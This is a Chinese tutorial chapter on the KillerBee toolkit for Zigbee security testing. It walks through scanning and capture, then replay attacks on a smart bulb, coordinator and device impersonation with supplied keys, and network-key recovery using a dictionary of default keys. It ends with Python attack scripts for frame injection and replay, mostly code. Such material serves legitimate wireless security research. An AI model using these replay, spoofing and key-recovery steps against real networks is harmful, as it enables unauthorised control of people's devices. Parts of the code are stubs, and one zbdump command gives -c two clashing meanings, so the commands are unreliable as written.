# KillerBee高级使用

### 5.1 KillerBee工具集完整指南

KillerBee是Zigbee安全研究的瑞士军刀，提供从侦察到攻击的完整工具链。本节深入讲解每个工具的高级用法和实战技巧。

#### 5.1.1 工具架构

KillerBee工具集基于统一的Python API构建，每个工具都是API的封装应用：

```
┌─────────────────────────────────────────┐
│         KillerBee Tools (CLI)           │
│  zbid / zbstumbler / zbdump / ...       │
├─────────────────────────────────────────┤
│         KillerBee Python API            │
│  KillerBee类 / 帧构造 / 加密 / 解析     │
├─────────────────────────────────────────┤
│         硬件抽象层 (Hardware HAL)        │
│  CC2531 / ATUSB / RZUSB / Serial        │
└─────────────────────────────────────────┘
```

### 5.2 zbid设备识别

**功能**：列出系统中所有KillerBee兼容的硬件设备。

**高级用法**：

```bash
# 列出所有设备（详细信息）
zbid -v

# 输出示例（详细）：
# ID: 0
#   Product: CC2531 dongle
#   Serial:  0x0123456789ABCDEF
#   USB VID: 0x0451
#   USB PID: 0x16ae
#   Firmware: kbfw-cc2531 v2.0
#   Capabilities: [sniff, inject, jamming]

# 仅列出设备ID和产品名
zbid -q

# 测试设备连接状态
zbid -t
```

**常见问题排查**：
- 设备未显示：检查USB连接、驱动安装、固件是否正确
- 权限不足（Linux）：检查udev规则或使用sudo
- 设备忙：确保没有其他程序在使用该设备

### 5.3 zbstumbler网络扫描

**功能**：主动发送Beacon Request，发现周围的Zigbee网络。

**高级用法**：

```bash
# 扫描所有2.4GHz信道
zbstumbler -c 11-26

# 扫描指定信道列表
zbstumbler -c 11,15,20,25

# 持续扫描（循环模式）
zbstumbler -c 11-26 --loop

# 每信道停留时间（毫秒）
zbstumbler -c 11-26 -d 200

# 详细输出（显示完整信标内容）
zbstumbler -c 15 -v

# 输出到JSON文件
zbstumbler -c 11-26 -o networks.json
```

**实战技巧**：
- 第一次扫描使用全信道快速扫，确认有网络后再精细扫
- 某些协调器信标发送间隔长，需要增加停留时间
- 配合WiFi分析仪使用，避开干扰严重的信道

### 5.4 zbdump数据包捕获

**功能**：捕获Zigbee数据包，支持保存为pcap格式。

**高级用法**：

```bash
# 基本捕获
zbdump -c 15 -w capture.pcap -i 0

# 捕获指定数量的包
zbdump -c 15 -i 0 -c 1000 -w capture.pcap

# 实时显示摘要
zbdump -c 15 -i 0 -v

# 过滤特定PAN ID
zbdump -c 15 -i 0 -p 0x1A2B -w capture.pcap

# 过滤特定设备地址
zbdump -c 15 -i 0 -s 0x1234 -w capture.pcap

# 仅捕获数据帧（忽略信标、ACK等）
zbdump -c 15 -i 0 --data-only -w capture.pcap

# 捕获并同时写入pcap和显示
zbdump -c 15 -i 0 -w capture.pcap -v

# 指定捕获时间（秒）
zbdump -c 15 -i 0 -w capture.pcap -t 60
```

**Wireshark实时分析**：

```bash
# 方法1：使用命名管道（Linux）
mkfifo /tmp/zigbee_pipe
zbdump -c 15 -i 0 -w /tmp/zigbee_pipe &
wireshark -k -i /tmp/zigbee_pipe

# 方法2：先捕获后分析
zbdump -c 15 -i 0 -w capture.pcap
# 然后在Wireshark中打开
```

### 5.5 zbreplay重放攻击

**功能**：重放pcap文件中的数据包。

**高级用法**：

```bash
# 重放所有数据包
zbreplay -f capture.pcap -c 15 -i 0

# 重放指定帧
zbreplay -f capture.pcap -c 15 -i 0 --frame 42

# 重放指定范围的帧
zbreplay -f capture.pcap -c 15 -i 0 --start 40 --end 50

# 重放N次
zbreplay -f capture.pcap -c 15 -i 0 -n 10

# 帧间延迟（毫秒）
zbreplay -f capture.pcap -c 15 -i 0 -d 100

# 仅重放数据帧
zbreplay -f capture.pcap -c 15 -i 0 --data-only

# 重放时调整源地址
zbreplay -f capture.pcap -c 15 -i 0 --src-addr 0xABCD

# 重放时调整目的地址
zbreplay -f capture.pcap -c 15 -i 0 --dst-addr 0x0000
```

**重放攻击实战流程**：

```bash
# 步骤1：捕获目标设备通信
zbdump -c 15 -i 0 -w bulb_control.pcap

# 步骤2：在Wireshark中分析，找到目标命令帧号
# 过滤器：zbee_zcl && zbee_zcl.cluster == 0x0006 && zbee_zcl.cmd.id == 0x01

# 步骤3：重放特定帧
zbreplay -f bulb_control.pcap -c 15 -i 0 --frame 156 -n 3 -d 500
```

### 5.6 zbfake协调器伪造

**功能**：创建伪造的Zigbee协调器或设备。

**高级用法**：

```bash
# 伪造协调器模式
zbfake --mode coordinator -c 15 -p 0x1234 -i 0

# 指定扩展PAN ID
zbfake --mode coordinator -c 15 -p 0x1234 \
       --extended-pan 00:12:4B:00:01:02:03:04 -i 0

# 指定网络密钥
zbfake --mode coordinator -c 15 -p 0x1234 \
       --nwk-key 01030507090b0d0f00020406080a0c0d -i 0

# 伪造设备加入模式
zbfake --mode join -c 15 -p 0x1234 -i 0

# 指定设备IEEE地址
zbfake --mode join -c 15 -p 0x1234 \
       -e 00:12:4B:00:0A:1B:2C:3D -i 0

# 使用指定的TC链接密钥
zbfake --mode join -c 15 -p 0x1234 \
       --tc-key 5A6967426565416C6C69616E63653039 -i 0
```

### 5.7 zbgoodfind密钥查找

**功能**：从pcap捕获文件中查找网络密钥。

**工作原理**：
1. 从pcap中提取Transport Key命令帧
2. 使用候选TC链接密钥逐一尝试解密
3. 通过MIC验证解密是否成功
4. 输出找到的网络密钥

**高级用法**：

```bash
# 使用内置默认密钥字典
zbgoodfind -f capture.pcap

# 使用自定义密钥字典
zbgoodfind -f capture.pcap -k my_keys.txt

# 详细输出（显示尝试过程）
zbgoodfind -f capture.pcap -v

# 指定要分析的帧范围
zbgoodfind -f capture.pcap --start 100 --end 200

# 输出找到的密钥到文件
zbgoodfind -f capture.pcap -o found_keys.txt
```

**密钥字典格式**：
```
# 每行一个密钥，格式：名称:密钥(hex)
ZigbeeAllianceDefault:5A6967426565416C6C69616E63653039
PhilipsHue:6A32323635524B39364A4C4D375A7274
TestKey:0102030405060708090A0B0C0D0E0F10
```

### 5.8 自定义脚本开发（KillerBee API使用）

KillerBee的Python API是其最强大的功能，可以编写自定义攻击脚本。

#### 5.8.1 API基础

```python
#!/usr/bin/env python3
"""
KillerBee API基础示例
"""

from killerbee import KillerBee, ZigbeeMessage
import struct

# 初始化KillerBee设备
kb = KillerBee()

# 列出可用设备
devices = kb.list_devices()
print(f"可用设备: {devices}")

# 打开第一个设备
kb.open(device=0)

# 设置信道
kb.set_channel(15)

# 获取当前信道
channel = kb.get_channel()
print(f"当前信道: {channel}")

# 关闭设备
kb.close()
```

#### 5.8.2 数据包发送

```python
#!/usr/bin/env python3
"""
发送自定义Zigbee数据包示例
"""

from killerbee import KillerBee
import struct
import time

def build_on_off_command(pan_id, src_addr, dst_addr, dst_ep, src_ep, 
                         nwk_key, on=True, frame_counter=0):
    """
    构造一个On/Off ZCL命令（NWK加密）
    
    实际使用中需要完整的帧构造逻辑，包括：
    - 802.15.4 MAC层帧头
    - Zigbee NWK层帧头 + 安全头
    - APS层帧头
    - ZCL命令
    - AES-CCM加密
    """
    # 这是一个简化示例，实际帧构造需要处理各层细节
    # 推荐使用Scapy + Zigbee层进行构造
    
    # MAC层帧控制：数据帧 + 短地址 + 确认请求
    mac_fcf = 0x8861  # Data frame, short addr, ACK request
    
    # NWK层帧控制：数据帧 + 安全
    nwk_fcf = 0x0000  # 根据实际情况设置
    
    # ZCL On/Off命令
    zcl_frame_ctrl = 0x11  # Client to Server, Profile-wide
    zcl_seq = 0x01
    zcl_cmd = 0x01 if on else 0x00  # On = 0x01, Off = 0x00
    zcl_payload = struct.pack('BBB', zcl_frame_ctrl, zcl_seq, zcl_cmd)
    
    # ... 完整构造需要加密等步骤 ...
    # 实际开发中建议使用Scapy的Zigbee支持
    
    return None  # 占位

# 使用示例
kb = KillerBee()
kb.open(device=0)
kb.set_channel(15)

# 发送数据包（示例）
# kb.inject(packet_bytes)

kb.close()
```

#### 5.8.3 使用Scapy构造Zigbee帧

KillerBee可以与Scapy集成，方便构造和解析Zigbee数据包：

```python
#!/usr/bin/env python3
"""
使用Scapy + KillerBee构造和发送Zigbee数据包
需要安装scapy-com（KillerBee项目提供）
"""

from scapy.all import *
from killerbee import KillerBee

# 加载Zigbee层支持（KillerBee提供zbscapy模块）
# from zbscapy import *

def build_zcl_onoff(dst_nwk, src_nwk, dst_ep, src_ep, on=True):
    """构造On/Off ZCL命令"""
    
    # 802.15.4层
    dot154 = Dot15d4FCS()
    dot154.fcf_frametype = 1  # Data frame
    dot154.fcf_security = 0
    dot154.fcf_pending = 0
    dot154.fcf_ackreq = 1
    dot154.fcf_panidcompress = 1
    dot154.fcf_destaddrmode = 2  # Short address
    dot154.fcf_framever = 0
    dot154.fcf_srcaddrmode = 2  # Short address
    dot154.seqnum = 0x01
    dot154.dest_panid = 0x1234
    dot154.dest_addr = dst_nwk
    dot154.src_addr = src_nwk
    
    # NWK层
    nwk = ZigbeeNWK()
    nwk.frametype = 0  # Data
    nwk.dest_addr = dst_nwk
    nwk.src_addr = src_nwk
    nwk.radius = 30
    nwk.seqnum = 0x01
    
    # APS层
    aps = ZigbeeAPS()
    aps.frametype = 0  # Data
    aps.delivery = 0  # Unicast
    aps.ack_format = 0
    aps.security = 0
    aps.ack_req = 0
    aps.extended_hdr = 0
    aps.destination = dst_ep
    aps.cluster = 0x0006  # On/Off
    aps.profile = 0x0104  # Home Automation
    aps.source = src_ep
    aps.counter = 0x01
    
    # ZCL层
    zcl = ZigbeeZCL()
    zcl.frametype = 1  # Profile-wide
    zcl.manufacturer = 0
    zcl.direction = 1  # Client to Server
    zcl.disable_default_resp = 0
    zcl.cmd_id = 0x01 if on else 0x00  # On / Off
    zcl.seqnum = 0x01
    
    packet = dot154 / nwk / aps / zcl
    return packet

# 使用示例
if __name__ == "__main__":
    pkt = build_zcl_onoff(
        dst_nwk=0x1234,
        src_nwk=0xABCD,
        dst_ep=1,
        src_ep=1,
        on=True
    )
    pkt.show()
    raw_bytes = bytes(pkt)
    print(f"Raw packet: {raw_bytes.hex()}")
```

#### 5.8.4 实战脚本：设备枚举器

```python
#!/usr/bin/env python3
"""
Zigbee设备枚举脚本
通过发送ZDO Active EP请求来发现设备端点
"""

import sys
import struct
from killerbee import KillerBee

class ZigbeeEnumerator:
    def __init__(self, channel=15, pan_id=0x1234, device=0):
        self.kb = KillerBee()
        self.kb.open(device=device)
        self.kb.set_channel(channel)
        self.channel = channel
        self.pan_id = pan_id
        self.seq = 0
    
    def send_zdo_active_ep_req(self, dst_addr):
        """发送Active EP Request（简化示例）"""
        # ZDO Active EP Request: Cluster 0x0005
        # 实际构造需要完整的帧格式
        self.seq += 1
        # ... 帧构造逻辑 ...
        print(f"[*] 发送Active EP请求到 0x{dst_addr:04X}")
    
    def sniff_response(self, timeout=5):
        """监听响应"""
        print(f"[*] 监听响应（{timeout}秒）...")
        # self.kb.sniff(timeout=timeout)
    
    def enumerate_device(self, nwk_addr):
        """枚举单个设备"""
        print(f"\n[*] 枚举设备 0x{nwk_addr:04X}")
        self.send_zdo_active_ep_req(nwk_addr)
        self.sniff_response()
    
    def close(self):
        self.kb.close()

def main():
    if len(sys.argv) < 3:
        print(f"用法: {sys.argv[0]} <pan_id> <target_addr>")
        print(f"示例: {sys.argv[0]} 0x1234 0x0000")
        sys.exit(1)
    
    pan_id = int(sys.argv[1], 16)
    target = int(sys.argv[2], 16)
    
    enum = ZigbeeEnumerator(channel=15, pan_id=pan_id, device=0)
    
    try:
        enum.enumerate_device(target)
    except KeyboardInterrupt:
        print("\n[*] 用户中断")
    finally:
        enum.close()

if __name__ == "__main__":
    main()
```

#### 5.8.5 实战脚本：自定义重放工具

```python
#!/usr/bin/env python3
"""
自定义重放攻击脚本
支持修改源/目的地址后重放
"""

import sys
from killerbee import KillerBee
import struct
import time

def read_pcap(filename):
    """读取pcap文件中的Zigbee数据包"""
    # 使用scapy或dpkt读取pcap
    # 这里简化处理
    packets = []
    try:
        from scapy.all import rdpcap
        pkts = rdpcap(filename)
        for pkt in pkts:
            if hasattr(pkt, 'payload'):
                packets.append(bytes(pkt))
    except ImportError:
        print("[!] 需要安装scapy")
    return packets

def replay_packets(packets, channel, device, delay=0, count=1):
    """重放数据包"""
    kb = KillerBee()
    kb.open(device=device)
    kb.set_channel(channel)
    
    print(f"[*] 在信道 {channel} 上重放 {len(packets)} 个数据包")
    print(f"[*] 重复次数: {count}, 延迟: {delay}ms")
    
    try:
        for i in range(count):
            print(f"[*] 第 {i+1}/{count} 轮")
            for idx, pkt in enumerate(packets):
                kb.inject(pkt)
                if delay > 0:
                    time.sleep(delay / 1000.0)
            print(f"[+] 第 {i+1} 轮完成")
    except KeyboardInterrupt:
        print("\n[*] 用户中断")
    finally:
        kb.close()
        print("[*] 设备已关闭")

def main():
    if len(sys.argv) < 3:
        print(f"用法: {sys.argv[0]} <pcap文件> <信道> [选项]")
        print(f"选项:")
        print(f"  -d <ms>    帧间延迟（毫秒）")
        print(f"  -n <num>   重复次数")
        print(f"  -i <dev>   设备ID")
        sys.exit(1)
    
    pcap_file = sys.argv[1]
    channel = int(sys.argv[2])
    delay = 0
    count = 1
    device = 0
    
    # 解析参数（简化）
    args = sys.argv[3:]
    i = 0
    while i < len(args):
        if args[i] == '-d' and i+1 < len(args):
            delay = int(args[i+1])
            i += 2
        elif args[i] == '-n' and i+1 < len(args):
            count = int(args[i+1])
            i += 2
        elif args[i] == '-i' and i+1 < len(args):
            device = int(args[i+1])
            i += 2
        else:
            i += 1
    
    packets = read_pcap(pcap_file)
    if not packets:
        print("[!] 未读取到数据包")
        sys.exit(1)
    
    replay_packets(packets, channel, device, delay, count)

if __name__ == "__main__":
    main()
```

---

---

